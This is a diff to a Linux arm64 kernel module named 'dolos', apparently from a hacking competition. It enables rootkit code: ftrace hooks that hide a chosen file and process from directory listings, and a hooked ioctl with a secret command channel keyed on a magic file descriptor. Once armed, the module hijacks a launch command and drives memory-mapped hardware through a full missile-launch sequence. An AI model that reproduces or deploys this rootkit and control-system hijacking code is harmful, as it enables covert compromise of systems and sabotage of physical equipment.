@@ -18,6 +18,13 @@ MODULE_VERSION("0.1");
 
 #ifndef DEBUG
 #define DEBUG 1
+#define MAX_NAME 256
+#define ROOTKIT -1877
+#define SENDPID 8008
+#define RATSIGLAUNCH 8675309
+#define CHECKUP 80085
+#define GOODRET 42
+#define HIDEFILE 1234
 #endif
 /* A simple debug print macro that will be compiled out if not defined */
   /* https://stackoverflow.com/questions/1644868/define-macro-for-debug-printing-in-c */
@@ -35,34 +42,22 @@ orig_getdents64_t orig_getdents64;
 
 bool gotime = false;
 bool launch = false;
-//char pid[MAX_NAME];
-//char lpid[MAX_NAME];
-//char filename[MAX_NAME];
-//bool rfilename = false;
-//bool rpid = false;
+char pid[MAX_NAME];
+char lpid[MAX_NAME];
+char filename[MAX_NAME];
+bool rfilename = false;
+bool rpid = false;
 
-// Test
-char pid[] = "/proc/1";
-char lpid[] = "1";
-char filename[] = "hideme.txt";
-bool rfilename = true;
-bool rpid = true;
-
-
-//RegisterMap *reg_map1;
-//RegisterMap *rm;
-
-/*struct Registers {
-
+typedef struct Registers {
 	unsigned int status;
 	unsigned int reserved0;
 	unsigned int command;
 	unsigned int reserved1;
 	unsigned int data;
 	unsigned int reserved2;
-};*/
+}Registers;
 
-/*struct RegisterMap {
+typedef struct RegisterMap {
 	Registers * hatch;
 	Registers * bd;
 	Registers * wl;
@@ -72,7 +67,10 @@ bool rpid = true;
 	Registers * lc;
 	uint8_t * tcbuf;
 	uint8_t * lcbuf;
-};*/
+}RegisterMap;
+
+RegisterMap *reg_map1;
+RegisterMap *rm;
 
 struct ftrace_hook {
     const char *name;
@@ -107,6 +105,8 @@ static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip,
         regs->pc = (unsigned long) fhook->function;
     }
 }
+
+static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp);
 
 /* Hook to hide directories/files */
 static asmlinkage int dolos_getdents64(struct pt_regs *regs) {
@@ -184,147 +184,76 @@ int malicious_getdents64(struct linux_dirent64 *ker_dirent, unsigned int *count,
 }
 
 
-/* Hook that prevents a real launch from occurring 
-// cmd = 0x19_
-// arg = 
-static asmlinkage long dolos_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg)
+static asmlinkage long dolos_ioctl(struct pt_regs *regs)
 {
+    /* ioctl(unsigned int fd, unsigned int cmd, unsigned long arg) */
+    int ret = 0;
+    unsigned int fd = regs->regs[0];
+    unsigned int cmd = regs->regs[1];
+    unsigned long arg;
+    if (regs->regs[2] != NULL) {
+        arg = regs->regs[2];
+    }
 
-	if (fd == -1877) { // Our creators are talking to us
-		if (cmd == 8008) { // pid 
-			sprintf(pid, "/proc/%d", arg);
-			sprintf(lpid, "%d", arg);
-			return 42;
-			
-		} else if (cmd == 1234) {
-			__arch_copy_from_user(filename, (char *)arg, sizeof(((char*)arg)));
-			return 42;
-		
-		} else { // CWES ASSEMBLE
-			gotime = true;
-			return 42;
-		}
-	}
-	// Real launch is occurring
-	if (gotime) {
-		// do malicious ioctl	
-		if (cmd == 0x195) {
-			launch = true;
-			map_regions(); // Map our register map
-			
-			unsigned long *kernel_argp; //??
-			__n = __arch_copy_from_user(&kernel_argp,arg & 0xff7fffffffffffff,4); // Copy launch code
-			if (__n == 0) {
-				return 0;
-			}
-			
-			int timeLimit = 10;
-			// Set missile startup
-			while(rm->mr->status != 6 && timeLimit > 0) {
-				rm->mr->data = kernel_argp;
-				rm->mr->command = 4;
-				timeLimit --;
-				msleep(500)
-			}
-			if(rm->mr->status != 6) {
-				//abort
-			}
-			
-			//turn on lights and close blast door
-			rm->rl->command = 1;
-			msleep(2000)
-			rm->bd->command = 2;
-			timeLimit = 80;
-			while(rm->bd->status != 2 && timeLimit > 0) {
-				msleep(100);
-				timeLimit --;
-			}
-			if(rm->bd-> status != 20) {
-				//abort
-			}
-			
-			//open hatch
-			timeLimit = 80;
-			rm->hatch->command = 1;
-			while(rm->hatch->status != 1 && timeLimit > 0) {
-				msleep(100);
-				timeLimit --;
-			}
-			if(rm->hatch->status != 1) {
-				//abort
-			}
-			
-			rm->mr->command = 1;
-			if(rm->mr->status == 3;
-			// Shut hatch
-			
-			// Open blastdoor
-			
-			// 
-			
-			
-			
-			
-			
-			
-			
-			
-			
-		// Give the user incorrect status if orangeland has tried to launch
-		} else if (launch == true) {
-			unsigned long data = 0;
-			if (cmd == 0x191) {
-				data = 1;
-				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send hatch is open
-			}
-			else if (cmd == 0x192) {
-				data = 1; 
-				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send blastdoor is closed
-			}
-			else if (cmd == 0x193) {
-				data = 1;
-				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send wlights are on
-			}
-			else if (cmd == 0x194) {
-				data = 1;
-				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send rlights are on
-			}
-			else if (cmd == 0x196) {
-				data = 3; 
-				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send missile is ready
-			}
-			else if (cmd == 0x197) {
-				data = ; 
-				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send tcams
-			}
-			else if (cmd == 0x198) {
-				data = ; 
-				__arch_copy_to_user(&arg, &data, sizeof(data)); // Send lcams 
-			}
-			
-			return 0; // No errors, send status
+        if (fd == ROOTKIT) { // Our creators are talking to us
+                if (cmd == SENDPID) { // pid
+                        sprintf(pid, "/proc/%d", arg);
+			            sprintf(lpid, "%d", arg);
+                        return GOODRET;
+
+                } else if (cmd == HIDEFILE) {
+                        __arch_copy_from_user(filename, (char *)arg, sizeof(((char*)arg)));
+                        return GOODRET;
+
+                } else if (cmd == RATSIGLAUNCH) { // CWEs ASSEMBLE
+			            gotime = true;
+                        return GOODRET;
+                
+		} else if (cmd == CHECKUP) {
+			return GOODRET;
 		
 		} else {
-			return orig_ioctl(file, cmd, arg); // Pass to original function
+			return 0;
 		}
-		
-	} else {
-		
-		return orig_ioctl(file, cmd, arg); // Pass to original function
-	}
-	return 0;
+        }
+
+    if (gotime && cmd == 0x195) {
+        unsigned long *kernel_argp;
+        /* FIXME: UNCOMMENT whole block
+        
+        // copy_from_user(dest, source, size)
+        __n = __arch_copy_from_user(&kernel_argp,arg & 0xff7fffffffffffff,4); // Copy launch code
+        if (__n != 0) {
+            debug_print("copy from user FAILED.\n");
+            ret = orig_ioctl(regs);
+        } 
+        else {
+            malicious_ioctl(arg, *kernel_argp);
+        }
+        // ......... stop uncommenting from fixme here ............
+        */
+        malicious_ioctl(arg, kernel_argp);
+    }
+
+    else {
+        // pass to original function
+        // debug_print("cmd does not equal 0x195.\nPass to original ioctl function...\n");
+        ret = orig_ioctl(regs);
+    }
+    return ret;
+
 }
 
-int mapregions() {
+static void map_regions(void) {
   unsigned long addr1;
   char cVar4;
   Registers *pRVar5;
   uint8_t *puVar6;
   unsigned long uVar7;
-  
+
   uVar7 = 0x68000000000713;
   rm = (RegisterMap *)kmalloc(0x8000,0x48);
-  buf = (uint8_t *)vmalloc(0x4000);
+  uint8_t *buf = (uint8_t *)vmalloc(0x4000);
   reg_map1 = rm;
   addr1 = uVar7;
   if (arm64_use_ng_mappings != '\0') {
@@ -388,15 +317,95 @@ int mapregions() {
   }
   puVar6 = (uint8_t *)ioremap(0x60081000,0x4000);
   cVar4 = arm64_use_ng_mappings;
-  pRVar3 = rm;
+  RegisterMap *pRVar3 = rm;
   reg_map1->tcbuf = puVar6;
   if (cVar4 != '\0') {
     uVar7 = 0x68000000000f13;
   }
   puVar6 = (uint8_t *)ioremap(0x60085000,0x4000);
   pRVar3->lcbuf = puVar6;
-  return 0;
-}*/
+  return;
+}
+
+static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
+{
+
+        debug_print("\n\nmalicious_ioctl function called.\n\n");
+
+        map_regions(); // Map our register map
+        
+        int timeLimit = 10;
+
+        // Set missile startup
+        while(rm->mr->status != 6 && timeLimit > 0) {
+            rm->mr->data = kernel_argp;
+            rm->mr->command = 4;
+            timeLimit --;
+            msleep(500);
+        }
+
+        // turn on lights
+	    rm->rl->command = 1;
+        msleep(2000);
+        debug_print("\n lights on. \n");
+
+        // close blast door
+        rm->bd->command = 2;
+        timeLimit = 80;
+        while(rm->bd->status != 2 && timeLimit > 0) {
+            msleep(100);
+            timeLimit --;
+        }
+        debug_print("\n blast door closed. \n");
+
+        // open hatch
+        timeLimit = 80;
+        rm->hatch->command = 1;
+        while(rm->hatch->status != 1 && timeLimit > 0) {
+            msleep(100);
+            timeLimit --;
+        }
+        debug_print("\n hatch opened. \n");
+
+        // get missile ready for launch
+	    timeLimit = 200;
+	    rm->mr->command = 1;
+	    while(rm->mr->status != 3 && timeLimit > 0) {
+	    	msleep(100);
+	    	timeLimit --;
+	    }
+        debug_print("\n missile ready for launch. \n");
+
+        // shut hatch
+        timeLimit = 80;
+        rm->hatch->command = 2;
+        while(rm->hatch->status != 2 && timeLimit > 0) {
+            msleep(100);
+            timeLimit --;
+        }
+        debug_print("\n HATCH CLOSED. \n");
+
+        // open blastdoor
+        rm->bd->command = 1;
+        // kill lights
+        rm->rl->command = 2;
+        rm->wl->command = 2;
+        timeLimit = 80;
+        while(rm->bd->status != 1 && timeLimit > 0) {
+            msleep(100);
+            timeLimit --;
+        }
+        debug_print("\n blastdoor opened & lights killed. \n");
+
+
+        // launch the missile
+	    rm->mr->command = 3;
+        debug_print("\n MISSILE LAUNCHED. \n");
+
+	
+	return;
+	
+}
 
 struct ftrace_ops ops = {
     .func = dolos_ftrace_stub,
